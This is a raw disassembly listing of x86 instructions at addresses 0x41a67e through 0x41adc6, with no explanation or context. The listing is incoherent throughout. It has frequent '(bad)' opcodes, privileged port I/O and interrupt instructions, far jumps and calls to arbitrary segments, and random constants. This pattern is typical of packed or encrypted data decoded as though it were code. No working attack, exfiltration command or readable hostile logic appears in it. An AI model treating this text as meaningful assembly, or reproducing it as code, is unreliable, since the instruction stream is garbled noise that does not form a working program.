  41a67e:	push   ss
  41a67f:	add    edx,ebx
  41a681:	mov    DWORD PTR ds:0xedd20422,ebx
  41a687:	sbb    eax,0x1ecb418f
  41a68c:	mov    edi,0xd989034f
  41a691:	dec    ebp
  41a692:	pop    edx
  41a693:	mov    DWORD PTR [eax-0x7c928f09],esp
  41a699:	mov    bl,0x5a
  41a69b:	push   esi
  41a69c:	ds aam 0x82
  41a69f:	jnp    0x41a67c
  41a6a1:	or     al,0xb9
  41a6a3:	xchg   edx,eax
  41a6a4:	icebp  
  41a6a5:	dec    ebx
  41a6a6:	lea    esi,[edi+0x673dad5]
  41a6ac:	jae    0x41a69f
  41a6ae:	xor    ch,cl
  41a6b0:	data16 jle 0x41a6dc
  41a6b3:	imul   esp,edi,0x15ee1468
  41a6b9:	clc    
  41a6ba:	(bad)  
  41a6bb:	xor    eax,0xdc4e679b
  41a6c0:	jns    0x41a732
  41a6c2:	inc    eax
  41a6c3:	dec    ecx
  41a6c4:	mov    ebx,0x4e5f5956
  41a6c9:	fs leave 
  41a6cb:	shl    DWORD PTR [esi-0x1],0xe3
  41a6cf:	leave  
  41a6d0:	scas   eax,DWORD PTR es:[edi]
  41a6d1:	mov    cl,0x9b
  41a6d3:	push   ss
  41a6d4:	mov    eax,DWORD PTR [esi+ecx*2-0x3710a1a6]
  41a6db:	add    dl,BYTE PTR [esi-0x15]
  41a6de:	out    0x63,al
  41a6e0:	cli    
  41a6e1:	je     0x41a73b
  41a6e3:	mov    dh,0x12
  41a6e5:	popf   
  41a6e6:	loope  0x41a73f
  41a6e8:	dec    edx
  41a6e9:	fs xchg esp,eax
  41a6eb:	push   edx
  41a6ec:	(bad)  
  41a6ed:	mov    ch,0x67
  41a6ef:	pop    ecx
  41a6f0:	cmp    DWORD PTR [esi-0x13],edx
  41a6f3:	mov    eax,edx
  41a6f5:	xchg   DWORD PTR gs:0xa82d6d57,eax
  41a6fc:	xchg   ebp,eax
  41a6fd:	into   
  41a6fe:	or     DWORD PTR [esi],esp
  41a700:	add    esp,DWORD PTR [eax+0x1]
  41a703:	xchg   ebx,eax
  41a704:	pop    edx
  41a705:	mov    bh,0x57
  41a707:	mov    ch,0x58
  41a709:	push   es
  41a70a:	dec    esp
  41a70b:	das    
  41a70c:	outs   dx,BYTE PTR ds:[esi]
  41a70d:	(bad)  
  41a70e:	mov    esi,0x8c4855ab
  41a713:	mov    bl,0x28
  41a715:	jmp    0xa477f5c7
  41a71a:	mov    edx,0x53eecd52
  41a71f:	popf   
  41a720:	inc    ebx
  41a721:	jge    0x41a6b7
  41a723:	xor    DWORD PTR ss:[eax+0x46],0xe
  41a728:	xlat   BYTE PTR ds:[ebx]
  41a729:	into   
  41a72a:	neg    dl
  41a72c:	inc    ebx
  41a72d:	cli    
  41a72e:	shr    DWORD PTR [ebx-0x7ee50c22],1
  41a734:	adc    eax,esi
  41a736:	add    al,0xe0
  41a738:	sahf   
  41a739:	ss dec eax
  41a73b:	add    eax,0xba93664d
  41a740:	pusha  
  41a741:	adc    edx,DWORD PTR [ecx-0x1b343db8]
  41a747:	fnstcw WORD PTR [esi+0x37]
  41a74a:	adc    DWORD PTR [edx],esp
  41a74c:	dec    ecx
  41a74d:	adc    BYTE PTR ds:0x3985c9e0,0xc5
  41a754:	xchg   ebx,eax
  41a755:	cld    
  41a756:	ret    
  41a757:	xchg   ecx,eax
  41a758:	jae    0x41a77a
  41a75a:	(bad)  
  41a75b:	xchg   edx,eax
  41a75c:	mov    esp,0xb2f3be73
  41a761:	das    
  41a762:	fld    TBYTE PTR [edx+eiz*8-0x2f]
  41a766:	or     eax,DWORD PTR [edi+0x9]
  41a769:	fsub   DWORD PTR [ecx]
  41a76b:	test   eax,0x3c9584a8
  41a770:	sbb    al,0x29
  41a772:	sti    
  41a773:	es (bad) 
  41a775:	jb     0x41a741
  41a777:	adc    eax,0x1bdaa0a6
  41a77c:	data16 outs dx,BYTE PTR ds:[esi]
  41a77e:	cmp    DWORD PTR [edi+0x52],eax
  41a781:	int    0xb3
  41a783:	push   ebx
  41a784:	or     eax,0xe7bb5ddb
  41a789:	popf   
  41a78a:	lods   eax,DWORD PTR ds:[esi]
  41a78b:	in     al,dx
  41a78c:	loopne 0x41a79c
  41a78e:	stos   DWORD PTR es:[edi],eax
  41a78f:	and    al,0x4e
  41a791:	mov    al,ds:0xb3ffd1c2
  41a796:	stc    
  41a797:	fprem  
  41a799:	sbb    ebp,DWORD PTR [ebx]
  41a79b:	cmp    eax,0x1c62dace
  41a7a0:	pop    ebp
  41a7a1:	ret    0xb2f0
  41a7a4:	add    DWORD PTR [edi+eax*2],esp
  41a7a7:	jno    0x41a7cd
  41a7a9:	mov    ds:0xd6470975,al
  41a7ae:	jmp    0x27e3:0x8cf0b409
  41a7b5:	nop
  41a7b6:	push   0x7a
  41a7b8:	push   0xa19a0ac3
  41a7bd:	call   0x7847:0x65442c5c
  41a7c4:	fs xor edx,eax
  41a7c7:	jp     0x41a80b
  41a7c9:	stos   BYTE PTR es:[edi],al
  41a7ca:	test   dl,bh
  41a7cc:	mov    bl,0xec
  41a7ce:	inc    eax
  41a7cf:	stos   DWORD PTR es:[edi],eax
  41a7d0:	ins    BYTE PTR es:[di],dx
  41a7d2:	nop
  41a7d3:	mov    al,0x2d
  41a7d5:	bound  ebx,QWORD PTR [ebx]
  41a7d7:	mov    ss,WORD PTR [ecx+0x58]
  41a7da:	(bad)  
  41a7db:	jnp    0x41a7b6
  41a7dd:	(bad)  
  41a7de:	retf   
  41a7df:	xchg   ebp,eax
  41a7e0:	cwde   
  41a7e1:	cmp    al,BYTE PTR [ebp+esi*8+0x69757f53]
  41a7e8:	and    DWORD PTR [edx-0x330f7ec9],0xffffffb2
  41a7ef:	adc    esp,DWORD PTR ds:0x87b699bf
  41a7f5:	scas   al,BYTE PTR es:[edi]
  41a7f6:	adc    eax,0xd4ff311f
  41a7fb:	add    ah,BYTE PTR [esi+0x10]
  41a7fe:	loope  0x41a7ca
  41a800:	imul   ebp,DWORD PTR [edi],0x22b2e24e
  41a806:	test   al,0xa8
  41a808:	cmp    DWORD PTR [edx-0x4182d215],eax
  41a80e:	dec    ecx
  41a80f:	adc    DWORD PTR [esi],ecx
  41a811:	data16 ins BYTE PTR es:[edi],dx
  41a813:	aad    0xad
  41a815:	test   al,0x8e
  41a817:	push   DWORD PTR [edi-0x7c]
  41a81a:	int3   
  41a81b:	test   DWORD PTR [ebp-0x45],esp
  41a81e:	xor    al,0xa5
  41a820:	test   al,0xdc
  41a822:	or     BYTE PTR [edi],cl
  41a824:	push   ebx
  41a825:	cld    
  41a826:	fnstcw WORD PTR [esi-0x39b45586]
  41a82c:	or     ecx,DWORD PTR [ecx-0x9c94c88]
  41a832:	push   0xadf2e2d2
  41a837:	fidiv  DWORD PTR [edx-0x59]
  41a83a:	jg     0x41a810
  41a83c:	and    ecx,DWORD PTR [edx+edi*4]
  41a83f:	xchg   edx,eax
  41a840:	add    dl,BYTE PTR [edi]
  41a842:	or     eax,0x562d03b6
  41a847:	fld    TBYTE PTR [ebx+eiz*1]
  41a84a:	imul   ebx,ebx,0x75
  41a84d:	pop    ss
  41a84e:	mov    BYTE PTR [edx-0x65],bl
  41a851:	mov    ecx,0x7e324e6f
  41a856:	mov    es,WORD PTR [esi+0x57]
  41a859:	xchg   esi,eax
  41a85a:	sub    al,0xfa
  41a85c:	jp     0x41a89c
  41a85e:	mov    dl,0xfd
  41a860:	sbb    ebx,ecx
  41a862:	mov    edx,ecx
  41a864:	ins    BYTE PTR es:[edi],dx
  41a865:	lock mov edi,0x1dd2f8d0
  41a86b:	xchg   BYTE PTR [ebx-0x27],ch
  41a86e:	loop   0x41a843
  41a870:	pop    ebx
  41a871:	xor    ebp,DWORD PTR [ebp-0x3ce71a31]
  41a877:	add    ebp,DWORD PTR [eax+0x1a5b8f1f]
  41a87d:	mov    ch,0xd8
  41a87f:	popf   
  41a880:	push   ss
  41a881:	shl    BYTE PTR fs:[ecx],cl
  41a884:	and    dl,BYTE PTR [esi-0x47cef7b0]
  41a88a:	jg     0x41a8fe
  41a88c:	add    al,0xa1
  41a88e:	rol    BYTE PTR [ebx],0xfe
  41a891:	outs   dx,BYTE PTR ds:[esi]
  41a892:	aas    
  41a893:	in     al,dx
  41a894:	scas   al,BYTE PTR es:[edi]
  41a895:	ss call 0x62500e76
  41a89b:	repz xchg edi,eax
  41a89d:	sub    al,0xf5
  41a89f:	repnz cmp ah,BYTE PTR [eax]
  41a8a2:	jae    0x41a87d
  41a8a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8a5:	xor    DWORD PTR [esi+0x12b119d0],esi
  41a8ab:	pop    edi
  41a8ac:	cmp    bh,0x34
  41a8af:	fwait
  41a8b0:	adc    ebp,DWORD PTR [ecx+0x14]
  41a8b3:	sar    BYTE PTR [eax+0x2126e174],1
  41a8b9:	sub    al,0x7
  41a8bb:	dec    ecx
  41a8bc:	imul   edx,DWORD PTR [ebp+0x14],0x7496769d
  41a8c3:	mov    BYTE PTR [ecx+0x4067539c],0xae
  41a8ca:	mov    edi,0x1a02e28b
  41a8cf:	xor    al,0x30
  41a8d1:	xchg   ebx,eax
  41a8d2:	push   0x99e6e491
  41a8d7:	shl    DWORD PTR [eax+0x7c205e19],0x3
  41a8de:	mov    bl,0x1b
  41a8e0:	jne    0x41a8fd
  41a8e2:	(bad)  [eax]
  41a8e4:	xchg   BYTE PTR [edx+ebx*1],bh
  41a8e7:	pop    ebx
  41a8e8:	push   ds
  41a8e9:	jp     0x41a8ec
  41a8eb:	std    
  41a8ec:	ins    BYTE PTR es:[edi],dx
  41a8ed:	(bad)  
  41a8ee:	fiadd  DWORD PTR gs:[ebx+esi*2]
  41a8f2:	mov    esp,0xf11e1b0b
  41a8f7:	into   
  41a8f8:	inc    eax
  41a8f9:	pushf  
  41a8fa:	mov    ds:0x7a2119c6,al
  41a8ff:	inc    esi
  41a900:	rcl    ah,cl
  41a902:	fisub  WORD PTR [esi+0x6bb79d94]
  41a908:	int3   
  41a909:	dec    ebx
  41a90a:	sub    BYTE PTR [ebx+0x84634db],dh
  41a910:	aas    
  41a911:	sbb    BYTE PTR [eax+0xfe88266],bl
  41a917:	inc    edx
  41a918:	mov    DWORD PTR [ebp+0x4a],ebx
  41a91b:	mov    cl,0xbe
  41a91d:	lods   eax,DWORD PTR ds:[esi]
  41a91e:	sub    BYTE PTR [esi+0x2e],0x51
  41a922:	mov    ebx,0x62c80141
  41a927:	mov    bl,0x88
  41a929:	jo     0x41a932
  41a92b:	call   0xb29f1ab9
  41a930:	cmp    eax,0x913fe387
  41a935:	dec    ebx
  41a936:	adc    al,0xab
  41a938:	add    BYTE PTR [ecx],ah
  41a93a:	loop   0x41a8bd
  41a93c:	adc    ecx,edx
  41a93e:	fiadd  DWORD PTR ds:0x775db871
  41a944:	fild   WORD PTR [ecx+0x40]
  41a947:	loop   0x41a998
  41a949:	out    0xd0,eax
  41a94b:	outs   dx,DWORD PTR ds:[esi]
  41a94c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a94d:	les    edx,FWORD PTR [edi+edx*8]
  41a950:	push   ebp
  41a951:	dec    edx
  41a952:	jmp    0x41a987
  41a954:	mov    edx,ecx
  41a956:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a957:	or     al,0x4d
  41a959:	ret    
  41a95a:	inc    ebp
  41a95b:	repnz adc al,0x85
  41a95e:	add    al,0xf2
  41a960:	dec    edi
  41a961:	(bad)  
  41a962:	bnd jp 0x41a9de
  41a965:	das    
  41a966:	mov    eax,0x28e143e4
  41a96b:	xchg   edx,ecx
  41a96d:	test   DWORD PTR [edi+0x1614b155],eax
  41a973:	(bad)  
  41a974:	or     BYTE PTR [ebx],bh
  41a976:	inc    edx
  41a977:	les    ebp,FWORD PTR [eax-0x6a5444d]
  41a97d:	shl    cl,cl
  41a97f:	sub    al,0x6d
  41a981:	jns    0x41a92b
  41a983:	repnz sub esp,edi
  41a986:	call   0x4a3:0xda956579
  41a98d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a98e:	(bad)  
  41a98f:	cld    
  41a990:	or     eax,ebx
  41a992:	loopne 0x41a963
  41a994:	mov    edx,0x9666a3ce
  41a999:	inc    ebp
  41a99a:	sub    al,0x7d
  41a99c:	mov    ebx,0x45f49cf
  41a9a1:	adc    ebx,ecx
  41a9a3:	cs dec edi
  41a9a5:	adc    eax,0x914722a1
  41a9aa:	or     BYTE PTR es:[ebp-0x4c],ch
  41a9ae:	les    esi,FWORD PTR [ecx]
  41a9b0:	xchg   esp,eax
  41a9b1:	mov    cl,0xe7
  41a9b3:	loope  0x41a93a
  41a9b5:	sbb    DWORD PTR [esi-0x48841071],edi
  41a9bb:	rcl    DWORD PTR [edx-0x55],1
  41a9be:	mov    bh,0x51
  41a9c0:	mov    ah,0xd3
  41a9c2:	cmp    al,0x34
  41a9c4:	imul   eax,DWORD PTR [eax],0x4b9fbb18
  41a9ca:	mov    ds:0xd22d0f59,al
  41a9cf:	adc    eax,0xb7d9cb15
  41a9d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9d5:	and    ch,BYTE PTR [eax-0x70512985]
  41a9db:	or     BYTE PTR [edx+0x1e67c1b],0x91
  41a9e2:	repz jno 0x41a9fb
  41a9e5:	pushf  
  41a9e6:	adc    al,0x88
  41a9e8:	add    BYTE PTR [ebx-0x51],cl
  41a9eb:	push   edi
  41a9ec:	inc    edx
  41a9ed:	pushf  
  41a9ee:	jmp    0xceba40bb
  41a9f3:	shr    DWORD PTR [edi],0xd5
  41a9f6:	pop    ss
  41a9f7:	sti    
  41a9f8:	pop    edx
  41a9f9:	iret   
  41a9fa:	(bad)  
  41a9fb:	out    0xe9,al
  41a9fd:	fcom   DWORD PTR [edi+0x7a]
  41aa00:	pop    ss
  41aa01:	adc    al,0x1c
  41aa03:	lods   eax,DWORD PTR ds:[esi]
  41aa04:	adc    bl,BYTE PTR [ebp+0x1bc83f89]
  41aa0a:	dec    esp
  41aa0b:	call   0x32c1c0d5
  41aa10:	das    
  41aa11:	sub    DWORD PTR [eax],ecx
  41aa13:	imul   edx,esp,0xffffffce
  41aa16:	jg     0x41aa5c
  41aa18:	xor    DWORD PTR ss:[esi+eax*1-0x1f],ecx
  41aa1d:	inc    esi
  41aa1e:	fmul   QWORD PTR [ecx-0x63ef44d8]
  41aa24:	rol    esi,1
  41aa26:	repz adc al,0x93
  41aa29:	loopne 0x41aa85
  41aa2b:	dec    ebp
  41aa2c:	outs   dx,DWORD PTR ds:[esi]
  41aa2d:	xchg   esp,eax
  41aa2e:	push   edi
  41aa2f:	in     eax,0xe4
  41aa31:	retf   
  41aa32:	mov    al,ds:0xe9ad7eb9
  41aa37:	mov    fs,WORD PTR [ebx+eiz*4-0x326ac425]
  41aa3e:	push   0x1e
  41aa40:	and    al,0x99
  41aa42:	sub    al,bl
  41aa44:	mov    eax,fs
  41aa46:	mov    dl,0x38
  41aa48:	fsub   QWORD PTR [eax]
  41aa4a:	inc    esi
  41aa4b:	dec    ebp
  41aa4c:	add    al,0x4a
  41aa4e:	clc    
  41aa4f:	cwde   
  41aa50:	and    al,BYTE PTR [eax+edx*1-0x74852ef0]
  41aa57:	mul    BYTE PTR ds:0x14b54185
  41aa5d:	lds    esi,FWORD PTR [ebp-0x67]
  41aa60:	sub    ah,ch
  41aa62:	mov    edi,0xf712ad99
  41aa67:	ins    DWORD PTR es:[edi],dx
  41aa68:	and    ebp,DWORD PTR [esi+0x7fdd28b1]
  41aa6e:	repz and dl,BYTE PTR [ecx-0x3262914c]
  41aa75:	fs pop es
  41aa77:	mov    BYTE PTR [ebx],ch
  41aa79:	dec    eax
  41aa7a:	jne    0x41aa13
  41aa7c:	sar    edi,cl
  41aa7e:	data16 jo 0x41aa9c
  41aa81:	mov    ecx,0x62887582
  41aa86:	xlat   BYTE PTR ds:[ebx]
  41aa87:	dec    ebx
  41aa88:	and    DWORD PTR [ecx],0xf85a1f48
  41aa8e:	stos   DWORD PTR es:[edi],eax
  41aa8f:	(bad)  
  41aa90:	jo     0x41aa7a
  41aa92:	jae    0x41aa80
  41aa94:	adc    BYTE PTR [ecx+0xa],0x98
  41aa98:	retf   0x1f6
  41aa9b:	(bad)  
  41aa9c:	push   edx
  41aa9d:	mov    ebp,0x35a2b0c7
  41aaa2:	jmp    0x9418ccd7
  41aaa7:	and    edx,DWORD PTR [ecx]
  41aaa9:	xchg   edx,eax
  41aaaa:	push   ss
  41aaab:	sbb    eax,0x21c39d18
  41aab0:	addr16 hlt 
  41aab2:	in     al,dx
  41aab3:	mov    esi,0xb847105d
  41aab8:	imul   ebx,DWORD PTR [esi+edi*4-0x6],0x2e35910f
  41aac0:	mul    esp
  41aac2:	push   es
  41aac3:	mov    esi,ebp
  41aac5:	push   ss
  41aac6:	jl     0x41ab23
  41aac8:	jecxz  0x41aa78
  41aaca:	cmp    al,0xe
  41aacc:	mov    ebx,ecx
  41aace:	mov    edx,0xbfa7c078
  41aad3:	popa   
  41aad4:	retf   
  41aad5:	pusha  
  41aad6:	sahf   
  41aad7:	fist   WORD PTR ds:[eax-0x12]
  41aadb:	mov    ds:0xc6cd5f41,al
  41aae0:	mov    ebp,0xf511ae78
  41aae5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aae6:	xor    BYTE PTR [eax+0x45],bh
  41aae9:	inc    esp
  41aaea:	adc    edx,DWORD PTR [ecx]
  41aaec:	dec    edx
  41aaed:	add    eax,0x540480a3
  41aaf2:	fisub  WORD PTR [edi+0x72308eb1]
  41aaf8:	inc    esi
  41aaf9:	xor    ebp,DWORD PTR [ebx]
  41aafb:	pop    es
  41aafc:	mov    bh,BYTE PTR [ecx-0x1648aa48]
  41ab02:	xchg   ebx,eax
  41ab03:	arpl   sp,di
  41ab05:	jo     0x41aad6
  41ab07:	repz xor al,0xa3
  41ab0a:	xor    ch,BYTE PTR [ebx]
  41ab0c:	sbb    bh,dl
  41ab0e:	pxor   mm7,QWORD PTR [edx]
  41ab11:	xchg   ecx,eax
  41ab12:	jmp    0x970d16b
  41ab17:	test   ch,0x6c
  41ab1a:	fisttp QWORD PTR [edi-0x68fcb0df]
  41ab20:	cdq    
  41ab21:	and    dh,BYTE PTR [edi-0x600854b7]
  41ab27:	adc    DWORD PTR [ecx+ecx*1+0x6c1853a2],0x34
  41ab2f:	daa    
  41ab30:	out    0x6c,al
  41ab32:	lods   eax,DWORD PTR ds:[esi]
  41ab33:	fsubr  QWORD PTR [edx]
  41ab35:	push   ss
  41ab36:	(bad)  
  41ab37:	rcl    DWORD PTR [esi+edx*8-0x49],1
  41ab3b:	sti    
  41ab3c:	and    ebx,DWORD PTR [ecx+0x35]
  41ab3f:	test   DWORD PTR [edi-0x20],0x8029d51c
  41ab46:	popa   
  41ab47:	cmp    DWORD PTR [edx+0x5f],esi
  41ab4a:	inc    BYTE PTR [eax]
  41ab4c:	pop    ss
  41ab4d:	push   ecx
  41ab4e:	out    0x62,eax
  41ab50:	sbb    edi,DWORD PTR [edx-0x5b]
  41ab53:	int3   
  41ab54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab55:	mov    eax,ds:0x3e84dc
  41ab5a:	xchg   esp,eax
  41ab5b:	mov    esp,0x7e2ab81c
  41ab60:	push   ss
  41ab61:	js     0x41aaf0
  41ab63:	ror    ebp,1
  41ab65:	sub    al,BYTE PTR [ebx+0x55fa9af1]
  41ab6b:	xchg   ebx,eax
  41ab6c:	inc    eax
  41ab6d:	inc    esp
  41ab6e:	push   es
  41ab6f:	sbb    eax,0x248fe517
  41ab74:	fidivr WORD PTR [ebp+0x1436ebbe]
  41ab7a:	inc    eax
  41ab7b:	jmp    0xa6aaf302
  41ab80:	(bad)  
  41ab81:	jecxz  0x41ab84
  41ab83:	stos   DWORD PTR es:[edi],eax
  41ab84:	pusha  
  41ab85:	in     eax,dx
  41ab86:	push   cs
  41ab87:	inc    ebp
  41ab88:	push   esp
  41ab89:	mov    dl,0xf8
  41ab8b:	aad    0x78
  41ab8d:	xchg   ebp,eax
  41ab8e:	add    eax,0x42df465f
  41ab93:	jp     0x41ac13
  41ab95:	fs xchg ebp,eax
  41ab97:	aam    0x8
  41ab99:	xchg   esi,eax
  41ab9a:	popa   
  41ab9b:	hlt    
  41ab9c:	icebp  
  41ab9d:	xor    ecx,DWORD PTR [edx+0x72]
  41aba0:	stos   DWORD PTR es:[edi],eax
  41aba1:	xchg   esp,eax
  41aba2:	mov    cl,0x82
  41aba4:	bound  edx,QWORD PTR [ecx+ecx*8]
  41aba7:	shr    DWORD PTR [eax+edi*8],1
  41abaa:	(bad)  
  41abab:	pop    ds
  41abac:	push   0xffffffaf
  41abae:	stc    
  41abaf:	jbe    0x41ac11
  41abb1:	push   ss
  41abb2:	sub    dh,al
  41abb4:	cdq    
  41abb5:	xor    bl,BYTE PTR [ebx]
  41abb7:	dec    esi
  41abb8:	sub    edx,DWORD PTR [esi-0x2a]
  41abbb:	sbb    eax,0xc64830a1
  41abc0:	inc    ebx
  41abc1:	sub    bl,BYTE PTR [edx-0x4d]
  41abc4:	je     0x41ab8c
  41abc6:	pop    ebx
  41abc7:	arpl   WORD PTR [edi-0x7ace8d69],bp
  41abcd:	pop    ss
  41abce:	sbb    edx,ecx
  41abd0:	popf   
  41abd1:	fcomi  st,st(7)
  41abd3:	lods   al,BYTE PTR ds:[esi]
  41abd4:	jp     0x41ab57
  41abd6:	scas   eax,DWORD PTR es:[edi]
  41abd7:	loop   0x41abdc
  41abd9:	dec    esp
  41abda:	xchg   esp,eax
  41abdb:	push   ebp
  41abdc:	xchg   esp,eax
  41abdd:	cdq    
  41abde:	shl    DWORD PTR [esi+0x2f],0xb8
  41abe2:	push   cs
  41abe3:	xchg   DWORD PTR [ecx-0x1f],ecx
  41abe6:	push   DWORD PTR ds:0x5cd353ea
  41abec:	call   0xda493bae
  41abf1:	(bad)  
  41abf2:	sti    
  41abf3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abf4:	cs lahf 
  41abf6:	push   ebx
  41abf7:	(bad)  
  41abf8:	sahf   
  41abf9:	repnz push es
  41abfb:	cli    
  41abfc:	mov    ds:0x424dda3c,al
  41ac01:	jne    0x41ac6b
  41ac03:	test   al,0x32
  41ac05:	addr16 mov cl,0x6a
  41ac08:	jecxz  0x41ac50
  41ac0a:	lea    ecx,fs:[esi]
  41ac0d:	in     eax,0x44
  41ac0f:	shl    DWORD PTR [esi-0xd],1
  41ac12:	mov    ebx,0x91607b0b
  41ac17:	icebp  
  41ac18:	or     cl,bl
  41ac1a:	stc    
  41ac1b:	mov    bh,0x98
  41ac1d:	aas    
  41ac1e:	dec    eax
  41ac1f:	sar    DWORD PTR [ebp-0x1d3d0c9c],0x22
  41ac26:	jp     0x41abc1
  41ac28:	or     dl,ah
  41ac2a:	sub    ch,BYTE PTR [esi-0x337e2de6]
  41ac30:	addr16 out 0xe8,eax
  41ac33:	cmp    bh,BYTE PTR [ebx]
  41ac35:	mov    bl,0xbf
  41ac37:	and    bl,BYTE PTR es:[ebp+0x28]
  41ac3b:	fisub  WORD PTR [edi+0x39]
  41ac3e:	aas    
  41ac3f:	scas   eax,DWORD PTR es:[edi]
  41ac40:	push   esp
  41ac41:	popa   
  41ac42:	or     eax,0xc855cd80
  41ac47:	(bad)  
  41ac48:	ror    DWORD PTR [ebx],1
  41ac4a:	or     ch,BYTE PTR [edx]
  41ac4c:	xchg   ebx,eax
  41ac4d:	cmp    BYTE PTR [esi+0x6a],0x33
  41ac51:	pop    esp
  41ac52:	into   
  41ac53:	stc    
  41ac54:	inc    ebx
  41ac55:	lock inc eax
  41ac57:	in     al,0x9c
  41ac59:	std    
  41ac5a:	inc    esi
  41ac5b:	int3   
  41ac5c:	pop    eax
  41ac5d:	out    dx,eax
  41ac5e:	stos   DWORD PTR es:[edi],eax
  41ac5f:	cmp    eax,0x1f5a7bec
  41ac64:	neg    BYTE PTR [esi+eiz*8]
  41ac67:	int    0xfe
  41ac69:	cwde   
  41ac6a:	jp     0x41acd6
  41ac6c:	xlat   BYTE PTR ds:[ebx]
  41ac6d:	ds data16 in al,dx
  41ac70:	jo     0x41ace8
  41ac72:	sbb    al,0x37
  41ac74:	add    DWORD PTR [ebp-0x1a],eax
  41ac77:	xchg   edx,eax
  41ac78:	mov    ecx,0x51bc7274
  41ac7d:	mov    eax,ds:0x7e0a547b
  41ac82:	call   0x61029e5d
  41ac87:	sar    DWORD PTR [ebx-0x3dcb6889],cl
  41ac8d:	enter  0xefbf,0x14
  41ac91:	fcomp  QWORD PTR [esi]
  41ac93:	popf   
  41ac94:	push   0xdeedfd7c
  41ac99:	rol    BYTE PTR [ebp+0x52],1
  41ac9c:	retf   0x973f
  41ac9f:	in     al,0x31
  41aca1:	or     al,0x52
  41aca3:	push   ss
  41aca4:	cdq    
  41aca5:	adc    BYTE PTR ds:0x5bc3769a,bh
  41acab:	aam    0x16
  41acad:	(bad)  
  41acae:	imul   eax,DWORD PTR [esp+eiz*8-0x6a],0x5d6ab734
  41acb6:	push   eax
  41acb7:	inc    esi
  41acb8:	push   0xd2edc676
  41acbd:	je     0x41ad01
  41acbf:	xchg   ebx,eax
  41acc0:	mov    ah,0x6a
  41acc2:	push   0x1aa56d8a
  41acc7:	push   ecx
  41acc8:	mov    eax,0xc8ee9100
  41accd:	or     edi,esi
  41accf:	shr    BYTE PTR [eax-0x14],1
  41acd2:	rol    DWORD PTR [ecx],0x1f
  41acd5:	cld    
  41acd6:	mov    cl,0x23
  41acd8:	and    esp,DWORD PTR [esi+ebp*4-0x6a69d3b7]
  41acdf:	popa   
  41ace0:	into   
  41ace1:	fadd   QWORD PTR [edx-0x3e]
  41ace4:	mov    dl,0x96
  41ace6:	shl    DWORD PTR [edx],1
  41ace8:	or     edx,DWORD PTR [edx]
  41acea:	hlt    
  41aceb:	push   es
  41acec:	xchg   DWORD PTR [edi-0x7e],edi
  41acef:	mov    bl,0xa5
  41acf1:	mov    ch,0xc2
  41acf3:	fs inc esi
  41acf5:	iret   
  41acf6:	ffree  st(4)
  41acf8:	inc    esp
  41acf9:	mov    DWORD PTR [ecx],ebx
  41acfb:	(bad)  
  41acfc:	rol    esp,cl
  41acfe:	or     al,0x56
  41ad00:	fcmovnu st,st(6)
  41ad02:	inc    ecx
  41ad03:	mov    BYTE PTR [eax+0x661f7ef],bh
  41ad09:	add    ch,bh
  41ad0b:	cli    
  41ad0c:	xor    DWORD PTR [ebx],esi
  41ad0e:	push   0xffffffbc
  41ad10:	xor    ah,BYTE PTR [ecx]
  41ad12:	and    eax,0xfba3294
  41ad17:	clc    
  41ad18:	(bad)  
  41ad19:	mov    fs,esi
  41ad1b:	xchg   esi,eax
  41ad1c:	mov    bl,0x6a
  41ad1e:	inc    ecx
  41ad1f:	mov    ds:0x893b8af0,al
  41ad24:	sbb    ebx,DWORD PTR [esi-0x2c]
  41ad27:	shl    BYTE PTR [edi-0x4d],0x93
  41ad2b:	mov    esp,0x1f67d81b
  41ad30:	popa   
  41ad31:	xchg   edx,eax
  41ad32:	outs   dx,DWORD PTR ds:[esi]
  41ad33:	xchg   ecx,eax
  41ad34:	jne    0x41acf4
  41ad36:	add    bh,bh
  41ad38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad3a:	fst    DWORD PTR [ecx+0x55]
  41ad3d:	leave  
  41ad3e:	adc    cl,dh
  41ad40:	stos   DWORD PTR es:[edi],eax
  41ad41:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  41ad43:	adc    DWORD PTR [ebx+0x225d045c],ebx
  41ad49:	sti    
  41ad4a:	push   ebx
  41ad4b:	les    esi,FWORD PTR [ecx-0x4]
  41ad4e:	dec    edx
  41ad4f:	fs call 0xb22e:0x4147f8c2
  41ad57:	jae    0x41ad07
  41ad59:	xor    edi,DWORD PTR ss:[eax]
  41ad5c:	inc    ecx
  41ad5d:	cmp    DWORD PTR [eax],ebp
  41ad5f:	xlat   BYTE PTR ds:[ebx]
  41ad60:	shl    esp,cl
  41ad62:	sbb    DWORD PTR [ecx],0x42
  41ad65:	dec    ecx
  41ad66:	test   al,0xbb
  41ad68:	push   eax
  41ad69:	jl     0x41acf1
  41ad6b:	scas   eax,DWORD PTR es:[edi]
  41ad6c:	mov    ds:0x1402723a,al
  41ad71:	and    ch,al
  41ad73:	adc    DWORD PTR [edi+0x4bd06917],ecx
  41ad79:	lahf   
  41ad7a:	pop    edi
  41ad7b:	mov    ds:0x510f717c,eax
  41ad80:	jmp    0xe9e9:0x60a15651
  41ad87:	dec    edi
  41ad88:	call   DWORD PTR [esi]
  41ad8a:	or     al,BYTE PTR [edx]
  41ad8c:	push   ds
  41ad8d:	adc    eax,0x4a2db581
  41ad92:	sti    
  41ad93:	and    cl,BYTE PTR [esi+0x28bca8b0]
  41ad99:	imul   BYTE PTR [eax-0x5831ca9b]
  41ad9f:	retf   0xb26b
  41ada2:	push   0x9618847d
  41ada7:	xor    dh,BYTE PTR [edx]
  41ada9:	mov    ch,0x56
  41adab:	mov    BYTE PTR [ecx],bh
  41adad:	loope  0x41ad61
  41adaf:	jnp    0x41ad4b
  41adb1:	mov    bl,0x87
  41adb3:	fs add al,0x44
  41adb6:	pop    ss
  41adb7:	xchg   ebp,eax
  41adb8:	jp     0x41ade4
  41adba:	fidivr WORD PTR [ebp+ebp*2-0x7b]
  41adbe:	jo     0x41ad51
  41adc0:	or     esi,DWORD PTR [ecx+0x6d191e18]
  41adc6:	(bad)  
